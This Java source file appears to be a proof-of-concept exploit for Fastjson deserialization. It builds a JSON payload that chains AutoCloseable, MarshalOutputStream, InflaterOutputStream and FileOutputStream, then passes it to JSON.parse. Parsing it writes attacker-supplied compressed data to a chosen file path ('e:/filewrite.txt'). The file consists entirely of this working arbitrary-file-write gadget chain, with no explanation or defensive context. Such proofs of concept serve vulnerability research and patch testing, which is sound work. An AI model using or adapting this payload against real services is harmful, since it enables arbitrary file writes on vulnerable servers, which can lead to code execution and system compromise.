package org.heptagram.fastjson;

import com.alibaba.fastjson.JSON;
import java.io.IOException;

public class FileWrite {
    public static void main(String[] args) throws IOException {
        String json = "{\n" +
                "  '@type': \"java.lang.AutoCloseable\",\n" +
                "  '@type': 'sun.rmi.server.MarshalOutputStream',\n" +
                "  'out': {\n" +
                "    '@type': 'java.util.zip.InflaterOutputStream',\n" +
                "    'out': {\n" +
                "      '@type': 'java.io.FileOutputStream',\n" +
                "      'file': 'e:/filewrite.txt',\n" +
                "      'append': false\n" +
                "    },\n" +
                "    'infl': {\n" +
                "      'input': {\n" +
                "        'array': 'eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==',\n" +
                "        'limit': 22\n" +
                "      }\n" +
                "    },\n" +
                "    'bufLen': 1048576\n" +
                "  },\n" +
                "  'protocolVersion': 1\n" +
                "}";
        JSON.parse(json);
    }

}
